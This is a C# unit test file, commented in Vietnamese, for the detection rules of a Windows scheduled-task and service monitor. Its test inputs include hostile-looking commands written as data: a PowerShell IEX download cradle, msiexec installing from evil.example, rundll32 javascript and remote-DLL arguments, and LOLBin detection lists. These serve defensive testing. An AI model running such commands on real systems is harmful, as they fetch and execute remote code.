using TaskServiceMonitor.Detection;
using TaskServiceMonitor.Models;
using TaskServiceMonitor.Monitoring;
using Xunit;

namespace TaskServiceMonitor.Tests;

/// <summary>
/// Test cho danh mục rule phát hiện (bước 11). Đối chiếu 1-1 với bảng "hành vi → Event
/// ID → rule" trong docs/hanh-vi-mapping.md — mỗi gạch đầu dòng mentor nêu phải có ít
/// nhất một test chứng minh app bắt được.
///
/// Toàn bộ rule ở <see cref="RuleCatalog"/> là hàm thuần ⇒ test trực tiếp, không cần
/// DB hay Windows. Rule tương quan (cần DB) nằm ở <c>CorrelationRules</c>, không test
/// ở đây.
/// </summary>
public class RuleCatalogTests
{
    private readonly WindowsEventParser _parser = new();

    private WindowsMonitorEvent Parse(string fixture) => _parser.Parse(SampleXml.Load(fixture));

    private static string[] RuleIds(WindowsMonitorEvent evt) =>
        [.. RuleCatalog.Evaluate(evt).Select(h => h.Rule.Id)];

    private static RuleHit? HitFor(WindowsMonitorEvent evt, string ruleId) =>
        RuleCatalog.Evaluate(evt).FirstOrDefault(h => h.Rule.Id == ruleId).Hit;

    private static WindowsMonitorEvent Task(
        int eventId = 4698,
        string? command = null,
        string? arguments = null,
        string? runLevel = null,
        string? runAsUser = null,
        string rawXml = "<Event />") => new()
        {
            EventId = eventId,
            Hostname = "MAY-TEST",
            TimeCreated = DateTime.UtcNow,
            ObjectType = MonitoredObjectType.ScheduledTask,
            ObjectName = @"\WinSentinelTest",
            ActionDescription = "test",
            TaskCommand = command,
            TaskArguments = arguments,
            TaskRunLevel = runLevel,
            TaskRunAsUser = runAsUser,
            Channel = "Security",
            ProviderName = "test",
            Data = new Dictionary<string, string>(),
            RawXml = rawXml
        };

    private static WindowsMonitorEvent Service(
        int eventId = 7045,
        string? imagePath = null,
        string? startType = null,
        string? previousStartType = null,
        IReadOnlyDictionary<string, string>? data = null,
        string rawXml = "<Event />") => new()
        {
            EventId = eventId,
            Hostname = "MAY-TEST",
            TimeCreated = DateTime.UtcNow,
            ObjectType = MonitoredObjectType.Service,
            ObjectName = "WinSentinelTest",
            ActionDescription = "test",
            ImagePath = imagePath,
            StartType = startType,
            PreviousStartType = previousStartType,
            Channel = "System",
            ProviderName = "test",
            Data = data ?? new Dictionary<string, string>(),
            RawXml = rawXml
        };

    // ============================================================ SCHEDULED TASK

    /// <summary>Mentor: "Tạo mới task" / "Xóa bỏ task".</summary>
    [Theory]
    [InlineData(4698, RuleCatalog.TaskCreated)]
    [InlineData(106, RuleCatalog.TaskCreated)]
    [InlineData(4699, RuleCatalog.TaskDeleted)]
    [InlineData(141, RuleCatalog.TaskDeleted)]
    [InlineData(4700, RuleCatalog.TaskToggled)]
    [InlineData(4701, RuleCatalog.TaskToggled)]
    [InlineData(4702, RuleCatalog.TaskUpdated)]
    [InlineData(140, RuleCatalog.TaskUpdated)]
    public void VongDoiTask_KhopDungRule(int eventId, string expectedRuleId)
    {
        Assert.Contains(expectedRuleId, RuleIds(Task(eventId)));
    }

    /// <summary>
    /// Mentor: "Thực thi từ thư mục bất thường: %TEMP%, C:\Users\Public".
    /// Bao gồm cả dạng biến môi trường NGUYÊN VĂN — task lưu đúng chuỗi người dùng gõ,
    /// không tự giãn.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Users\Public\a.cmd")]
    [InlineData(@"C:\Users\x\AppData\Local\Temp\dropper.exe")]
    [InlineData(@"%TEMP%\a.exe")]
    [InlineData(@"%APPDATA%\b.exe")]
    [InlineData(@"%PUBLIC%\c.exe")]
    [InlineData(@"C:\Windows\Temp\d.exe")]
    [InlineData(@"C:\Users\x\Downloads\e.exe")]
    public void TaskChayTuThuMucGhiDuoc_High(string command)
    {
        var hit = HitFor(Task(command: command), RuleCatalog.TaskWritableDir);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// Đường dẫn đáng ngờ nấp trong THAM SỐ: Command là cmd.exe hoàn toàn hợp lệ nên
    /// chỉ soi Command là bỏ sót.
    /// </summary>
    [Fact]
    public void TaskCoDuongDanDangNgoTrongThamSo_VanBat()
    {
        var evt = Task(
            command: @"C:\Windows\System32\cmd.exe",
            arguments: @"/c C:\Users\Public\payload.bat");

        Assert.Contains(RuleCatalog.TaskWritableDir, RuleIds(evt));
    }

    /// <summary>ProgramData chỉ Medium — rất nhiều phần mềm hợp lệ dùng thư mục này.</summary>
    [Fact]
    public void TaskChayTuProgramData_ChiMedium()
    {
        var hit = HitFor(Task(command: @"C:\ProgramData\Vendor\update.exe"), RuleCatalog.TaskWritableDir);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>Mentor: "các lệnh đáng ngờ (mshta.exe...)".</summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\mshta.exe")]
    [InlineData(@"C:\Windows\System32\regsvr32.exe")]
    [InlineData(@"C:\Windows\System32\certutil.exe")]
    [InlineData(@"C:\Windows\System32\wscript.exe")]
    public void TaskGoiLolBin_High(string command)
    {
        var hit = HitFor(Task(command: command), RuleCatalog.TaskLolBin);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// TINH CHINH TU DU LIEU THAT — đừng đảo ngược nếu chưa đo lại.
    ///
    /// rundll32/msiexec nằm ở System32 và KHÔNG có dấu hiệu chạy từ xa thì KHÔNG báo.
    /// Chấm theo tên thôi thì trên 15.059 event thật, rundll32 sinh 6 cảnh báo High và
    /// cả 6 đều là dương tính giả (một task Microsoft: PcaPatchDbTask).
    /// </summary>
    [Theory]
    [InlineData(@"%windir%\system32\rundll32.exe", "apphelp.dll,ShimFlushCache")]
    [InlineData(@"C:\Windows\System32\msiexec.exe", "/i product.msi /qn")]
    [InlineData(@"C:\Windows\System32\rundll32.exe", null)]
    public void LolBinCanNguCanh_KhongCoDauHieuTuXa_KhongBao(string command, string? arguments)
    {
        Assert.DoesNotContain(RuleCatalog.TaskLolBin, RuleIds(Task(command: command, arguments: arguments)));
    }

    /// <summary>Nhưng rundll32/msiexec KÈM dấu hiệu tải/chạy từ xa thì vẫn phải bắt.</summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\rundll32.exe", "javascript:alert(1)")]
    [InlineData(@"C:\Windows\System32\rundll32.exe", @"\\10.0.0.5\share\eviI.dll,Start")]
    [InlineData(@"C:\Windows\System32\msiexec.exe", "/i https://evil.example/p.msi /qn")]
    [InlineData(@"C:\Windows\System32\rundll32.exe", "scrobj.dll,Run")]
    public void LolBinCanNguCanh_CoDauHieuTuXa_High(string command, string arguments)
    {
        var hit = HitFor(Task(command: command, arguments: arguments), RuleCatalog.TaskLolBin);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>Mentor: "powershell -enc". LOLBin nấp trong tham số cũng phải bắt.</summary>
    [Theory]
    [InlineData("-enc SQBuAHYA")]
    [InlineData("-EncodedCommand SQBuAHYA")]
    [InlineData("-w hidden -nop")]
    [InlineData("-ExecutionPolicy Bypass -File x.ps1")]
    [InlineData("IEX (New-Object Net.WebClient).DownloadString('http://x')")]
    public void TaskDungPowerShellDangNgo_High(string arguments)
    {
        var evt = Task(command: @"C:\Windows\System32\powershell.exe", arguments: arguments);
        var hit = HitFor(evt, RuleCatalog.TaskEncodedPs);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>Mentor: "Thực thi với quyền cao: NT AUTHORITY\SYSTEM hoặc administrator".</summary>
    [Theory]
    [InlineData("HighestAvailable", null)]
    [InlineData(null, "S-1-5-18")]
    [InlineData(null, "LocalSystem")]
    [InlineData(null, @"NT AUTHORITY\SYSTEM")]
    [InlineData(null, @"BUILTIN\Administrators")]
    public void TaskChayQuyenCao_Medium(string? runLevel, string? runAsUser)
    {
        var evt = Task(runLevel: runLevel, runAsUser: runAsUser, command: @"C:\Windows\System32\cmd.exe");
        var hit = HitFor(evt, RuleCatalog.TaskElevated);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>Task chạy dưới tài khoản người dùng thường thì KHÔNG được báo.</summary>
    [Theory]
    [InlineData("Users")]
    [InlineData("S-1-5-21-1111-2222-3333-1001")]
    [InlineData("DESKTOP-ABC\\kazyy")]
    public void TaskChayQuyenThuong_KhongBao(string runAsUser)
    {
        Assert.DoesNotContain(RuleCatalog.TaskElevated, RuleIds(Task(runAsUser: runAsUser)));
    }

    /// <summary>
    /// Task quyền cao TRỎ VÀO thư mục ghi được = leo thang đặc quyền kinh điển.
    /// Cả hai rule cùng khớp, và mức tổng phải là High.
    /// </summary>
    [Fact]
    public void TaskQuyenCaoOThuMucGhiDuoc_SinhCaHaiCanhBao()
    {
        var evt = Task(
            command: @"C:\Users\Public\evil.exe",
            runLevel: "HighestAvailable",
            runAsUser: "S-1-5-18");

        var ids = RuleIds(evt);

        Assert.Contains(RuleCatalog.TaskWritableDir, ids);
        Assert.Contains(RuleCatalog.TaskElevated, ids);
        Assert.Equal(RiskLevel.High, RuleCatalog.HighestSeverity(evt));
    }

    /// <summary>
    /// Task dùng ComHandler KHÔNG có Command — đây là dữ liệu thật (rất nhiều task hệ
    /// thống như vậy), không phải parse lỗi. Rule phải bỏ qua êm, không nổ.
    /// </summary>
    [Fact]
    public void TaskComHandlerKhongCoCommand_KhongNo()
    {
        var evt = Task(command: null) with { TaskActionType = "ComHandler" };

        var ids = RuleIds(evt);

        Assert.DoesNotContain(RuleCatalog.TaskWritableDir, ids);
        Assert.DoesNotContain(RuleCatalog.TaskLolBin, ids);
    }

    // ================================================================= SERVICE

    /// <summary>Mentor: "Tạo mới hoặc cài đặt Service" — một thao tác, hai event.</summary>
    [Theory]
    [InlineData(7045)]
    [InlineData(4697)]
    public void CaiService_KhopRule(int eventId)
    {
        Assert.Contains(RuleCatalog.ServiceInstalled,
            RuleIds(Service(eventId, imagePath: @"C:\Windows\System32\svchost.exe")));
    }

    /// <summary>Mentor: "Service chạy từ thư mục Temp hoặc AppData".</summary>
    [Theory]
    [InlineData(@"C:\Windows\Temp\svc.exe")]
    [InlineData(@"C:\Users\x\AppData\Local\svc.exe")]
    [InlineData(@"C:\Users\Public\svc.exe")]
    public void ServiceOThuMucGhiDuoc_High(string imagePath)
    {
        var hit = HitFor(Service(imagePath: imagePath), RuleCatalog.ServiceNonStandardPath);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// Mentor: "Service không nằm trong các thư mục hệ thống bảo mật". Ngoài System32
    /// nhưng cũng không phải thư mục ghi được ⇒ Medium, không phải High.
    /// </summary>
    [Fact]
    public void ServiceNgoaiThuMucHeThong_Medium()
    {
        var hit = HitFor(Service(imagePath: @"D:\Tools\myservice.exe"), RuleCatalog.ServiceNonStandardPath);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>
    /// Service ở vị trí chuẩn thì KHÔNG được báo. Bao gồm cả dạng có dấu nháy + tham
    /// số và dạng tiền tố NT — đây là nơi dễ sinh dương tính giả hàng loạt nhất.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\svchost.exe -k netsvcs")]
    [InlineData(@"""C:\Program Files\App\svc.exe"" -k")]
    [InlineData(@"\??\C:\Windows\System32\drivers\x.sys")]
    [InlineData(@"\SystemRoot\System32\drivers\y.sys")]
    [InlineData(@"C:\Windows\SysWOW64\z.exe")]
    public void ServiceOViTriChuan_KhongBao(string imagePath)
    {
        Assert.DoesNotContain(RuleCatalog.ServiceNonStandardPath, RuleIds(Service(imagePath: imagePath)));
    }

    /// <summary>Mentor: "Service Crash / Dừng đột ngột" — gồm cả 4 ID thêm ở bước 11.</summary>
    [Theory]
    [InlineData(7034)]
    [InlineData(7031)]
    [InlineData(7024)]
    [InlineData(7000)]
    [InlineData(7009)]
    public void ServiceDungBatThuong_KhopRule(int eventId)
    {
        var hit = HitFor(Service(eventId), RuleCatalog.ServiceCrash);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>
    /// 7036 CỐ Ý không nằm trong nhóm crash: nó báo cả chuyển sang Running lẫn Stopped,
    /// mà chưa có mẫu thật để biết phân biệt bằng field nào — đưa vào là đoán cấu trúc.
    /// </summary>
    [Fact]
    public void Service7036_ChuaTinhLaCrash()
    {
        Assert.DoesNotContain(RuleCatalog.ServiceCrash, RuleIds(Service(7036)));
    }

    /// <summary>Mentor: "Thay đổi cấu hình" — start type là phần SCM có phát event.</summary>
    [Fact]
    public void DoiStartType_Medium()
    {
        var hit = HitFor(
            Service(7040, startType: "auto start", previousStartType: "demand start"),
            RuleCatalog.ServiceStartTypeChanged);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    // ------------------------------------------------- 4657: đổi binPath / tài khoản

    /// <summary>
    /// Mentor: "Thay đổi cấu hình (ImagePath / binPath)". SCM KHÔNG phát event nào —
    /// đây là đường log thật duy nhất, qua audit registry.
    ///
    /// ⚠️ Nhánh này chưa có mẫu XML thật (máy dev chưa bật SACL). Rule đọc phòng thủ
    /// qua <c>Data</c> nên tên field khác dự đoán thì chỉ đơn giản không khớp.
    /// </summary>
    [Fact]
    public void Registry4657_DoiImagePath_High()
    {
        var evt = Service(4657, data: new Dictionary<string, string>
        {
            ["ObjectName"] = @"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSentinelTest",
            ["ObjectValueName"] = "ImagePath",
            ["OldValue"] = @"C:\Windows\System32\good.exe",
            ["NewValue"] = @"C:\Users\Public\evil.exe"
        });

        var hit = HitFor(evt, RuleCatalog.ServiceImagePathChanged);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
        Assert.Contains("evil.exe", hit.Evidence);
    }

    /// <summary>Mentor: "Thay đổi tài khoản khởi chạy". Đổi sang LocalSystem ⇒ High.</summary>
    [Fact]
    public void Registry4657_DoiTaiKhoanSangLocalSystem_High()
    {
        var evt = Service(4657, data: new Dictionary<string, string>
        {
            ["ObjectName"] = @"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSentinelTest",
            ["ObjectValueName"] = "ObjectName",
            ["OldValue"] = @"NT AUTHORITY\LocalService",
            ["NewValue"] = "LocalSystem"
        });

        var hit = HitFor(evt, RuleCatalog.ServiceAccountChanged);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>4657 trên khoá registry KHÁC (không phải Services) thì bỏ qua.</summary>
    [Fact]
    public void Registry4657_KhoaKhongPhaiServices_BoQua()
    {
        var evt = Service(4657, data: new Dictionary<string, string>
        {
            ["ObjectName"] = @"\REGISTRY\MACHINE\SOFTWARE\Vendor\App",
            ["ObjectValueName"] = "ImagePath",
            ["NewValue"] = @"C:\Users\Public\evil.exe"
        });

        Assert.DoesNotContain(RuleCatalog.ServiceImagePathChanged, RuleIds(evt));
    }

    [Theory]
    [InlineData(@"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Spooler\ImagePath", "Spooler")]
    [InlineData(@"\REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Services\BITS", "BITS")]
    public void BocTenServiceTuDuongDanRegistry(string keyPath, string expected)
    {
        Assert.Equal(expected, RuleCatalog.ServiceNameFromRegistryPath(keyPath));
    }

    // ========================================================== Lưới an toàn

    /// <summary>
    /// Dấu hiệu nằm trong RawXml nhưng không ở field đã parse — hành vi của
    /// RiskScorer trước bước 11, cố ý giữ lại.
    /// </summary>
    [Fact]
    public void DauHieuChiNamTrongRawXml_VanBat()
    {
        var evt = Service(rawXml: "<Event><Data>powershell -w hidden</Data></Event>");
        var hit = HitFor(evt, RuleCatalog.SuspiciousRawContent);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// Không được sinh cảnh báo TRÙNG Ý NGHĨA: khi dấu hiệu đã nằm ở field có cấu trúc
    /// thì rule chuyên biệt lo, lưới an toàn phải im.
    /// </summary>
    [Fact]
    public void DauHieuDaCoRuleRieng_LuoiAnToanKhongBaoTrung()
    {
        var evt = Task(
            command: @"C:\Windows\System32\powershell.exe",
            arguments: "-w hidden",
            rawXml: "<Event><Data>powershell -w hidden</Data></Event>");

        var ids = RuleIds(evt);

        Assert.Contains(RuleCatalog.TaskEncodedPs, ids);
        Assert.DoesNotContain(RuleCatalog.SuspiciousRawContent, ids);
    }

    // ====================================================== Trên toàn bộ mẫu thật

    /// <summary>
    /// Test QUAN TRỌNG NHẤT của tầng phát hiện: không mẫu XML thật nào sinh ra cảnh
    /// báo mức High. Nới rule đến mức gây dương tính giả trên dữ liệu bình thường thì
    /// test này đổ.
    /// </summary>
    [Theory]
    [InlineData("4697_service_installed_security.xml")]
    [InlineData("4698_task_created_exec.xml")]
    [InlineData("4699_task_deleted.xml")]
    [InlineData("4700_task_enabled.xml")]
    [InlineData("4701_task_disabled_comhandler.xml")]
    [InlineData("4701_task_disabled_exec.xml")]
    [InlineData("4702_task_updated_comhandler.xml")]
    [InlineData("7040_service_starttype_changed.xml")]
    [InlineData("7045_service_installed_system.xml")]
    [InlineData("106_task_registered_operational.xml")]
    [InlineData("140_task_updated_operational.xml")]
    [InlineData("141_task_deleted_operational.xml")]
    [InlineData("200_task_action_started.xml")]
    [InlineData("201_task_action_completed.xml")]
    public void MauThat_KhongSinhCanhBaoHigh(string fixture)
    {
        var hits = RuleCatalog.Evaluate(Parse(fixture));

        Assert.DoesNotContain(hits, h => h.Hit.Severity == RiskLevel.High);
    }

    /// <summary>Mọi rule phải có bằng chứng đọc được, không được để trống.</summary>
    [Theory]
    [InlineData("4698_task_created_exec.xml")]
    [InlineData("7045_service_installed_system.xml")]
    [InlineData("7040_service_starttype_changed.xml")]
    public void MoiCanhBaoDeuCoCauBangChung(string fixture)
    {
        var hits = RuleCatalog.Evaluate(Parse(fixture));

        Assert.NotEmpty(hits);
        Assert.All(hits, h => Assert.False(string.IsNullOrWhiteSpace(h.Hit.Evidence)));
    }

    // ============================================================ Bảng rule

    /// <summary>
    /// Bảng rule trả cho <c>GET /api/alerts/rules</c> phải phủ CẢ hai rule tương quan
    /// (vốn không nằm trong <c>All</c> vì cần DB) — nếu không mentor đọc bảng sẽ thấy
    /// thiếu đúng phần "phân tích tương quan hành vi".
    /// </summary>
    [Fact]
    public void BangRule_CoCaRuleTuongQuan()
    {
        var ids = RuleCatalog.Describe().Select(r => r.Id).ToArray();

        Assert.Contains(RuleCatalog.TaskCommandChanged, ids);
        Assert.Contains(RuleCatalog.TaskCreateThenDelete, ids);
        Assert.Equal(ids.Length, ids.Distinct().Count());
    }

    /// <summary>Mã rule không được trùng nhau.</summary>
    [Fact]
    public void MaRule_KhongTrung()
    {
        var ids = RuleCatalog.All.Select(r => r.Id).ToArray();

        Assert.Equal(ids.Length, ids.Distinct().Count());
    }
}
